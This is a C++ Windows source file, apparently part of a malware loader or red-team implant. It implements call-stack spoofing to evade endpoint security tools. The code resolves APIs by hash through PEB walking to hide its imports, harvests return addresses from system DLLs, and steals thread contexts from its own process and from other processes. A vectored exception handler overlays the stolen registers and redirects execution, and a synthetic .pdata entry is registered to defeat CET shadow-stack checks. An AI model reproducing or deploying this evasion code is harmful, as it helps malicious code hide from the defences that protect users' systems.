// ============================================================================
// Call-Context Hardening - Implementation
// ============================================================================
// No STL, no CRT heap allocations. Static arrays, xorshift PRNG.
// All Win32/NT APIs runtime-resolved via PEB walking (no IAT).
// ============================================================================

#include "call_context.h"
#include "peb_lookup.h"
#include "hashing.h"
#include "nt_types.h"
#include "config.h"
#include "prng.h"

#include <intrin.h>

namespace CallContext {

    // ========================================================================
    // Constants
    // ========================================================================

    static constexpr int MAX_RETURN_ADDRESSES = 4096;
    static constexpr int MAX_SCAN_MODULES     = 5;

    // ========================================================================
    // ASM Stub Globals
    // ========================================================================

    extern "C" PVOID g_spoof_ret    = nullptr;
    extern "C" PVOID g_proxy_frame  = nullptr;

    // ========================================================================
    // Internal State
    // ========================================================================

    static PVOID    s_ReturnAddresses[MAX_RETURN_ADDRESSES];
    static int      s_ReturnAddrCount = 0;
    static Protocol s_ActiveProtocol  = PROTOCOL_VEH_FALLBACK;
    static bool     s_Initialized     = false;
    static PVOID    s_VehHandle       = nullptr;

    // Stolen thread context
    static CONTEXT  s_StolenContext     = {};
    static bool     s_HasStolenContext  = false;

    // VEH arming — handler only fires when this magic is set.
    // Prevents swallowing legitimate access violations.
    static constexpr uint64_t VEH_ARMED_MAGIC = 0xDE5A500FCA11ULL;
    static volatile uint64_t  s_VehArmed       = 0;

    // ntdll .text boundaries for RIP validation (secondary guard)
    static ULONG_PTR s_NtdllTextStart = 0;
    static ULONG_PTR s_NtdllTextEnd   = 0;

    // ========================================================================
    // Stealth-resolved API pointers (resolved once during init)
    // ========================================================================

    typedef HANDLE(WINAPI* OpenThread_t)(DWORD, BOOL, DWORD);
    typedef BOOL(WINAPI* GetThreadContext_t)(HANDLE, LPCONTEXT);
    typedef BOOL(WINAPI* CloseHandle_t)(HANDLE);
    typedef DWORD(WINAPI* GetCurrentProcessId_t)();
    typedef DWORD(WINAPI* GetCurrentThreadId_t)();
    typedef PVOID(WINAPI* VirtualAlloc_t)(PVOID, SIZE_T, DWORD, DWORD);
    typedef BOOL(WINAPI* VirtualFree_t)(PVOID, SIZE_T, DWORD);
    typedef BOOL(WINAPI* IsUserCetAvailableInEnvironment_t)(DWORD);

    static OpenThread_t             s_pOpenThread           = nullptr;
    static GetThreadContext_t       s_pGetThreadContext      = nullptr;
    static CloseHandle_t            s_pCloseHandle          = nullptr;
    static GetCurrentProcessId_t    s_pGetCurrentProcessId  = nullptr;
    static GetCurrentThreadId_t     s_pGetCurrentThreadId   = nullptr;
    static VirtualAlloc_t           s_pVirtualAlloc         = nullptr;
    static VirtualFree_t            s_pVirtualFree          = nullptr;

    static bool ResolveAPIs() {
        HMODULE hK32 = Resolver::GetModuleByHash(HASH_MODULE(L"kernel32.dll"));
        if (!hK32) return false;

        s_pOpenThread          = (OpenThread_t)Resolver::GetExportByHash(hK32, HASH_API("OpenThread"));
        s_pGetThreadContext    = (GetThreadContext_t)Resolver::GetExportByHash(hK32, HASH_API("GetThreadContext"));
        s_pCloseHandle         = (CloseHandle_t)Resolver::GetExportByHash(hK32, HASH_API("CloseHandle"));
        s_pGetCurrentProcessId = (GetCurrentProcessId_t)Resolver::GetExportByHash(hK32, HASH_API("GetCurrentProcessId"));
        s_pGetCurrentThreadId  = (GetCurrentThreadId_t)Resolver::GetExportByHash(hK32, HASH_API("GetCurrentThreadId"));
        s_pVirtualAlloc        = (VirtualAlloc_t)Resolver::GetExportByHash(hK32, HASH_API("VirtualAlloc"));
        s_pVirtualFree         = (VirtualFree_t)Resolver::GetExportByHash(hK32, HASH_API("VirtualFree"));

        return (s_pOpenThread && s_pGetThreadContext && s_pCloseHandle &&
                s_pGetCurrentProcessId && s_pGetCurrentThreadId &&
                s_pVirtualAlloc && s_pVirtualFree);
    }

    // ========================================================================
    // Return Address Harvesting
    // ========================================================================
    // Scans .text sections of system DLLs for addresses immediately after
    // CALL instructions (E8 xx xx xx xx → ret addr at +5, FF 15 xx xx xx xx → +6).
    // These are legitimate return addresses that appear in normal call stacks.

    static void HarvestReturnAddresses() {
        s_ReturnAddrCount = 0;

        uint32_t moduleHashes[] = {
            HASH_MODULE(L"ntdll.dll"),
            HASH_MODULE(L"kernel32.dll"),
            HASH_MODULE(L"kernelbase.dll"),
            HASH_MODULE(L"user32.dll"),
            HASH_MODULE(L"advapi32.dll"),
        };

        for (int m = 0; m < MAX_SCAN_MODULES; m++) {
            HMODULE hMod = Resolver::GetModuleByHash(moduleHashes[m]);
            if (!hMod) continue;

            PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)hMod;
            if (pDos->e_magic != IMAGE_DOS_SIGNATURE) continue;

            PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((BYTE*)hMod + pDos->e_lfanew);
            PIMAGE_SECTION_HEADER pSec = IMAGE_FIRST_SECTION(pNt);

            for (int s = 0; s < pNt->FileHeader.NumberOfSections; s++, pSec++) {
                // Find .text by checking executable flag
                if (!(pSec->Characteristics & IMAGE_SCN_MEM_EXECUTE)) continue;

                BYTE* textBase = (BYTE*)hMod + pSec->VirtualAddress;
                DWORD textSize = pSec->Misc.VirtualSize;

                for (DWORD off = 0; off < textSize - 6 && s_ReturnAddrCount < MAX_RETURN_ADDRESSES; off++) {
                    // Near call: E8 xx xx xx xx → return addr at offset+5
                    if (textBase[off] == 0xE8) {
                        BYTE next = textBase[off + 5];
                        // Filter: skip if followed by padding/nop/int3
                        if (next != 0xCC && next != 0x00 && next != 0x90) {
                            s_ReturnAddresses[s_ReturnAddrCount++] = &textBase[off + 5];
                            off += 4;  // Skip past the call instruction
                        }
                    }
                    // Indirect call: FF 15 xx xx xx xx → return addr at offset+6
                    else if (textBase[off] == 0xFF && textBase[off + 1] == 0x15) {
                        BYTE next = textBase[off + 6];
                        if (next != 0xCC && next != 0x00) {
                            s_ReturnAddresses[s_ReturnAddrCount++] = &textBase[off + 6];
                            off += 5;
                        }
                    }
                }

                break;  // Only scan first executable section per module
            }
        }

        LOG("CallContext: Harvested %d return addresses from system DLLs", s_ReturnAddrCount);
    }

    // ========================================================================
    // Thread Context Theft
    // ========================================================================
    // Steals a full CONTEXT from a sibling thread in our process.
    // If no siblings exist, falls back to cross-process theft from a
    // benign system process (any process with >3 threads in Waiting state).

    static bool StealThreadContext() {
        __try {
            HMODULE hNtdll = Resolver::GetModuleByHash(HASH_MODULE(L"ntdll.dll"));
            if (!hNtdll) return false;

            NtQuerySystemInformation_t pNtQSI = (NtQuerySystemInformation_t)
                Resolver::GetExportByHash(hNtdll, HASH_API("NtQuerySystemInformation"));
            if (!pNtQSI) return false;

            // Allocate buffer for process/thread enumeration
            ULONG bufSize = 2 * 1024 * 1024;
            BYTE* buf = (BYTE*)s_pVirtualAlloc(nullptr, bufSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
            if (!buf) return false;

            ULONG retLen = 0;
            NTSTATUS status = pNtQSI(SystemProcessInformation, buf, bufSize, &retLen);
            if (!NT_SUCCESS(status)) {
                s_pVirtualFree(buf, 0, MEM_RELEASE);
                // Retry with larger buffer
                bufSize = retLen + 0x10000;
                buf = (BYTE*)s_pVirtualAlloc(nullptr, bufSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
                if (!buf) return false;
                status = pNtQSI(SystemProcessInformation, buf, bufSize, &retLen);
                if (!NT_SUCCESS(status)) {
                    s_pVirtualFree(buf, 0, MEM_RELEASE);
                    return false;
                }
            }

            DWORD myPid = s_pGetCurrentProcessId();
            DWORD myTid = s_pGetCurrentThreadId();
            bool stolen = false;

            // Pass 1: steal from sibling thread in our own process
            PMY_SYSTEM_PROCESS_INFORMATION proc = (PMY_SYSTEM_PROCESS_INFORMATION)buf;
            while (true) {
                DWORD pid = (DWORD)(ULONG_PTR)proc->UniqueProcessId;
                if (pid == myPid) {
                    for (ULONG i = 0; i < proc->NumberOfThreads && !stolen; i++) {
                        DWORD tid = (DWORD)(ULONG_PTR)proc->Threads[i].ClientId.UniqueThread;
                        if (tid == myTid) continue;

                        HANDLE hThread = s_pOpenThread(THREAD_GET_CONTEXT | THREAD_QUERY_INFORMATION, FALSE, tid);
                        if (hThread) {
                            CONTEXT ctx = {};
                            ctx.ContextFlags = CONTEXT_FULL;
                            if (s_pGetThreadContext(hThread, &ctx)) {
                                s_StolenContext = ctx;
                                s_HasStolenContext = true;
                                stolen = true;
                                LOG_SUCCESS("CallContext: Stole context from own TID %d (RIP=%p)", tid, (PVOID)ctx.Rip);
                            }
                            s_pCloseHandle(hThread);
                        }
                    }
                    break;
                }
                if (proc->NextEntryOffset == 0) break;
                proc = (PMY_SYSTEM_PROCESS_INFORMATION)((BYTE*)proc + proc->NextEntryOffset);
            }

            // Pass 2: cross-process fallback — steal from any benign process
            if (!stolen) {
                LOG("CallContext: No sibling threads. Trying cross-process theft...");
                proc = (PMY_SYSTEM_PROCESS_INFORMATION)buf;
                while (true) {
                    DWORD pid = (DWORD)(ULONG_PTR)proc->UniqueProcessId;
                    if (pid != myPid && pid > 4 && proc->NumberOfThreads > 3) {
                        for (ULONG i = 0; i < proc->NumberOfThreads && !stolen; i++) {
                            // Only steal from threads in Waiting state (5) for stability
                            if (proc->Threads[i].ThreadState != 5) continue;

                            DWORD tid = (DWORD)(ULONG_PTR)proc->Threads[i].ClientId.UniqueThread;
                            HANDLE hThread = s_pOpenThread(THREAD_GET_CONTEXT | THREAD_SUSPEND_RESUME, FALSE, tid);
                            if (hThread) {
                                CONTEXT ctx = {};
                                ctx.ContextFlags = CONTEXT_FULL;
                                if (s_pGetThreadContext(hThread, &ctx)) {
                                    s_StolenContext = ctx;
                                    s_HasStolenContext = true;
                                    stolen = true;
                                    LOG_SUCCESS("CallContext: Cross-process stole from PID %d TID %d (RIP=%p)",
                                        pid, tid, (PVOID)ctx.Rip);
                                }
                                s_pCloseHandle(hThread);
                            }
                        }
                        if (stolen) break;
                    }
                    if (proc->NextEntryOffset == 0) break;
                    proc = (PMY_SYSTEM_PROCESS_INFORMATION)((BYTE*)proc + proc->NextEntryOffset);
                }
            }

            s_pVirtualFree(buf, 0, MEM_RELEASE);
            return stolen;
        }
        __except (EXCEPTION_EXECUTE_HANDLER) {
            LOG_ERROR("CallContext: StealThreadContext crashed — fallback to RIP-only context");
            return false;
        }
    }

    // ========================================================================
    // CET Detection
    // ========================================================================

    bool IsCetActive() {
        __try {
            HMODULE hK32 = Resolver::GetModuleByHash(HASH_MODULE(L"kernel32.dll"));
            if (!hK32) return false;

            IsUserCetAvailableInEnvironment_t pCheck =
                (IsUserCetAvailableInEnvironment_t)Resolver::GetExportByHash(
                    hK32, HASH_API("IsUserCetAvailableInEnvironment"));

            if (!pCheck) return false;

            // Verify it's not a forwarded export (address inside export directory = forwarder string)
            PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)hK32;
            PIMAGE_NT_HEADERS pNt  = (PIMAGE_NT_HEADERS)((BYTE*)hK32 + pDos->e_lfanew);
            DWORD expRva  = pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
            DWORD expSize = pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;
            ULONG_PTR addr = (ULONG_PTR)pCheck;
            if (addr >= (ULONG_PTR)hK32 + expRva && addr < (ULONG_PTR)hK32 + expRva + expSize) {
                return false;  // Forwarded export — can't call
            }

            return pCheck(2);  // USER_CET_ENVIRONMENT_WIN32_PROCESS
        }
        __except (EXCEPTION_EXECUTE_HANDLER) {
            return false;
        }
    }

    // ========================================================================
    // VEH Handler — Full Context Overlay
    // ========================================================================
    // On ACCESS_VIOLATION, overlays stolen context registers onto the
    // faulting thread and redirects RIP to the spoofed return address.
    //
    // SAFETY: Only fires when s_VehArmed == VEH_ARMED_MAGIC AND the
    // faulting RIP is within ntdll .text. This prevents swallowing
    // legitimate exceptions from our code or third-party libraries.

    static LONG WINAPI VehHandler(PEXCEPTION_POINTERS pExInfo) {
        if (pExInfo->ExceptionRecord->ExceptionCode != EXCEPTION_ACCESS_VIOLATION) {
            return EXCEPTION_CONTINUE_SEARCH;
        }

        // Guard 1: Only fire when explicitly armed
        if (s_VehArmed != VEH_ARMED_MAGIC) {
            return EXCEPTION_CONTINUE_SEARCH;
        }

        // Guard 2: Only fire if faulting RIP is within ntdll .text
        // (where our trampoline executes)
        if (s_NtdllTextStart != 0 && s_NtdllTextEnd != 0) {
            ULONG_PTR faultRip = (ULONG_PTR)pExInfo->ContextRecord->Rip;
            if (faultRip < s_NtdllTextStart || faultRip >= s_NtdllTextEnd) {
                return EXCEPTION_CONTINUE_SEARCH;
            }
        }

        // Guard 3: Protocol and spoof target must be set
        if (s_ActiveProtocol != PROTOCOL_VEH_FALLBACK || g_spoof_ret == nullptr) {
            return EXCEPTION_CONTINUE_SEARCH;
        }

        if (s_HasStolenContext) {
            // Overlay non-volatile registers (callee-saved)
            pExInfo->ContextRecord->Rbp = s_StolenContext.Rbp;
            pExInfo->ContextRecord->Rbx = s_StolenContext.Rbx;
            pExInfo->ContextRecord->Rdi = s_StolenContext.Rdi;
            pExInfo->ContextRecord->Rsi = s_StolenContext.Rsi;
            pExInfo->ContextRecord->R12 = s_StolenContext.R12;
            pExInfo->ContextRecord->R13 = s_StolenContext.R13;
            pExInfo->ContextRecord->R14 = s_StolenContext.R14;
            pExInfo->ContextRecord->R15 = s_StolenContext.R15;

            // Overlay XMM non-volatile registers for full unwind coherence
            pExInfo->ContextRecord->Xmm6  = s_StolenContext.Xmm6;
            pExInfo->ContextRecord->Xmm7  = s_StolenContext.Xmm7;
            pExInfo->ContextRecord->Xmm8  = s_StolenContext.Xmm8;
            pExInfo->ContextRecord->Xmm9  = s_StolenContext.Xmm9;
            pExInfo->ContextRecord->Xmm10 = s_StolenContext.Xmm10;
            pExInfo->ContextRecord->Xmm11 = s_StolenContext.Xmm11;
            pExInfo->ContextRecord->Xmm12 = s_StolenContext.Xmm12;
            pExInfo->ContextRecord->Xmm13 = s_StolenContext.Xmm13;
            pExInfo->ContextRecord->Xmm14 = s_StolenContext.Xmm14;
            pExInfo->ContextRecord->Xmm15 = s_StolenContext.Xmm15;
        }

        // Redirect execution to spoofed return address
        pExInfo->ContextRecord->Rip = (DWORD64)g_spoof_ret;

        // Disarm after handling — one-shot per arming
        s_VehArmed = 0;

        return EXCEPTION_CONTINUE_EXECUTION;
    }

    // ========================================================================
    // .pdata Synthesis for CET Compliance
    // ========================================================================
    // Registers a synthetic RUNTIME_FUNCTION entry covering our .text section
    // so the Windows unwinder treats our frames as legitimate during CET
    // shadow stack validation.

    static void SynthesizePdata() {
        __try {
            HMODULE hNtdll = Resolver::GetModuleByHash(HASH_MODULE(L"ntdll.dll"));
            if (!hNtdll) return;

            RtlAddFunctionTable_t pAddFT = (RtlAddFunctionTable_t)
                Resolver::GetExportByHash(hNtdll, HASH_API("RtlAddFunctionTable"));
            if (!pAddFT) {
                LOG_INFO("CallContext: RtlAddFunctionTable not found — skipping .pdata synthesis");
                return;
            }

            // Get our own module base from PEB
            PMY_PEB pPeb = (PMY_PEB)__readgsqword(0x60);
            HMODULE hSelf = (HMODULE)pPeb->ImageBaseAddress;
            if (!hSelf) return;

            // Check if we already have .pdata
            PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)hSelf;
            PIMAGE_NT_HEADERS pNt  = (PIMAGE_NT_HEADERS)((BYTE*)hSelf + pDos->e_lfanew);
            DWORD pdataRva = pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION].VirtualAddress;
            if (pdataRva != 0) {
                LOG_SUCCESS("CallContext: Own module already has .pdata — CET-compliant");
                return;
            }

            // Find our .text section
            PIMAGE_SECTION_HEADER pSec = IMAGE_FIRST_SECTION(pNt);
            DWORD textRva = 0, textSize = 0;
            for (int i = 0; i < pNt->FileHeader.NumberOfSections; i++, pSec++) {
                if (pSec->Characteristics & IMAGE_SCN_MEM_EXECUTE) {
                    textRva  = pSec->VirtualAddress;
                    textSize = pSec->Misc.VirtualSize;
                    break;
                }
            }
            if (textRva == 0) return;

            // Allocate: RUNTIME_FUNCTION_ENTRY + minimal UNWIND_INFO
            SIZE_T allocSize = sizeof(IMAGE_RUNTIME_FUNCTION_ENTRY) + 8;
            BYTE* pBlock = (BYTE*)s_pVirtualAlloc(nullptr, allocSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
            if (!pBlock) return;

            IMAGE_RUNTIME_FUNCTION_ENTRY* pEntry = (IMAGE_RUNTIME_FUNCTION_ENTRY*)pBlock;
            BYTE* pUnwind = pBlock + sizeof(IMAGE_RUNTIME_FUNCTION_ENTRY);

            // Minimal leaf-function UNWIND_INFO: Version=1, no codes, no frame
            pUnwind[0] = 0x01;  // Version=1, Flags=0
            pUnwind[1] = 0x00;  // SizeOfProlog=0
            pUnwind[2] = 0x00;  // CountOfCodes=0
            pUnwind[3] = 0x00;  // FrameRegister=0

            pEntry->BeginAddress = textRva;
            pEntry->EndAddress   = textRva + textSize;

            // UnwindData is RVA relative to base passed to RtlAddFunctionTable
            DWORD64 unwindRva = (DWORD64)pUnwind - (DWORD64)hSelf;
            if (unwindRva > 0xFFFFFFFF) {
                s_pVirtualFree(pBlock, 0, MEM_RELEASE);
                LOG_ERROR("CallContext: Unwind info out of RVA range — .pdata skipped");
                return;
            }
            pEntry->UnwindData = (DWORD)unwindRva;

            BOOLEAN ok = pAddFT((PRUNTIME_FUNCTION)pEntry, 1, (DWORD64)hSelf);
            if (ok) {
                LOG_SUCCESS("CallContext: Registered synthetic .pdata (text 0x%X-0x%X) — CET-compliant",
                    textRva, textRva + textSize);
            } else {
                s_pVirtualFree(pBlock, 0, MEM_RELEASE);
                LOG_ERROR("CallContext: RtlAddFunctionTable failed");
            }
        }
        __except (EXCEPTION_EXECUTE_HANDLER) {
            LOG_ERROR("CallContext: .pdata synthesis crashed (non-fatal)");
        }
    }

    // ========================================================================
    // Initialize
    // ========================================================================

    InitResult Initialize() {
        InitResult result = { false, PROTOCOL_VEH_FALLBACK, 0, false, false };

        if (s_Initialized) {
            result.Success         = true;
            result.ActiveProtocol  = s_ActiveProtocol;
            result.ReturnAddresses = s_ReturnAddrCount;
            result.ContextStolen   = s_HasStolenContext;
            result.CetDetected     = (s_ActiveProtocol == PROTOCOL_SDIE_CET);
            return result;
        }

        // Step 1: Resolve all internal APIs via PEB
        if (!ResolveAPIs()) {
            LOG_ERROR("CallContext: Failed to runtime-resolve APIs");
            return result;
        }

        // Step 2: CET detection
        bool cetActive = IsCetActive();
        result.CetDetected = cetActive;

        if (cetActive) {
            LOG("CallContext: CET/HSP DETECTED — activating SDIE protocol");
            s_ActiveProtocol = PROTOCOL_SDIE_CET;
            SynthesizePdata();
        } else {
            LOG("CallContext: CET not detected — using VEH fallback protocol");
            s_ActiveProtocol = PROTOCOL_VEH_FALLBACK;

            // Register VEH via runtime-resolved RtlAddVectoredExceptionHandler
            HMODULE hNtdll = Resolver::GetModuleByHash(HASH_MODULE(L"ntdll.dll"));
            if (hNtdll) {
                RtlAddVectoredExceptionHandler_t pAddVEH = (RtlAddVectoredExceptionHandler_t)
                    Resolver::GetExportByHash(hNtdll, HASH_API("RtlAddVectoredExceptionHandler"));
                if (pAddVEH) {
                    s_VehHandle = pAddVEH(1, (PVOID)VehHandler);
                    if (s_VehHandle) {
                        LOG_SUCCESS("CallContext: VEH registered via runtime ntdll resolution");
                    }
                }

                // Capture ntdll .text boundaries for VEH RIP validation
                PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)hNtdll;
                PIMAGE_NT_HEADERS pNt  = (PIMAGE_NT_HEADERS)((BYTE*)hNtdll + pDos->e_lfanew);
                PIMAGE_SECTION_HEADER pSec = IMAGE_FIRST_SECTION(pNt);
                for (int si = 0; si < pNt->FileHeader.NumberOfSections; si++, pSec++) {
                    if (pSec->Characteristics & IMAGE_SCN_MEM_EXECUTE) {
                        s_NtdllTextStart = (ULONG_PTR)hNtdll + pSec->VirtualAddress;
                        s_NtdllTextEnd   = s_NtdllTextStart + pSec->Misc.VirtualSize;
                        break;
                    }
                }
            }
        }

        // Step 3: Steal thread context (own process first, then cross-process)
        bool contextOk = StealThreadContext();
        result.ContextStolen = contextOk;
        if (!contextOk) {
            LOG_INFO("CallContext: No context stolen — VEH will use RIP-only spoofing");
        }

        // Step 4: Harvest return addresses from system DLLs
        HarvestReturnAddresses();
        result.ReturnAddresses = s_ReturnAddrCount;

        result.Success = (s_ReturnAddrCount > 0);
        result.ActiveProtocol = s_ActiveProtocol;
        s_Initialized = true;

        LOG_SUCCESS("CallContext: Initialized — %d return addrs, context=%s, protocol=%s",
            s_ReturnAddrCount,
            contextOk ? "STOLEN" : "NONE",
            cetActive ? "SDIE+CET" : "VEH");

        return result;
    }

    // ========================================================================
    // GetLegitimateReturnAddress
    // ========================================================================

    PVOID GetLegitimateReturnAddress() {
        if (s_ReturnAddrCount == 0) return nullptr;
        int index = (int)(Prng::Next32() % (uint32_t)s_ReturnAddrCount);
        return s_ReturnAddresses[index];
    }

    // ========================================================================
    // GetActiveProtocol
    // ========================================================================

    Protocol GetActiveProtocol() {
        return s_ActiveProtocol;
    }

    // ========================================================================
    // Shutdown — cleanup VEH, zero sensitive state
    // ========================================================================

    void Shutdown() {
        // Remove VEH handler
        if (s_VehHandle) {
            HMODULE hNtdll = Resolver::GetModuleByHash(HASH_MODULE(L"ntdll.dll"));
            if (hNtdll) {
                RtlRemoveVectoredExceptionHandler_t pRemoveVEH = (RtlRemoveVectoredExceptionHandler_t)
                    Resolver::GetExportByHash(hNtdll, HASH_API("RtlRemoveVectoredExceptionHandler"));
                if (pRemoveVEH) {
                    pRemoveVEH(s_VehHandle);
                    LOG("CallContext: VEH handler removed");
                }
            }
            s_VehHandle = nullptr;
        }

        // Zero globals
        g_spoof_ret   = nullptr;
        g_proxy_frame = nullptr;
        s_VehArmed    = 0;

        // Zero sensitive arrays (volatile writes — optimizer-proof)
        volatile BYTE* p = (volatile BYTE*)s_ReturnAddresses;
        for (size_t i = 0; i < sizeof(s_ReturnAddresses); i++) p[i] = 0;
        s_ReturnAddrCount = 0;

        volatile BYTE* c = (volatile BYTE*)&s_StolenContext;
        for (size_t i = 0; i < sizeof(s_StolenContext); i++) c[i] = 0;
        s_HasStolenContext = false;

        s_NtdllTextStart = 0;
        s_NtdllTextEnd = 0;
        s_Initialized = false;

        LOG("CallContext: Shutdown complete");
    }

} // namespace CallContext
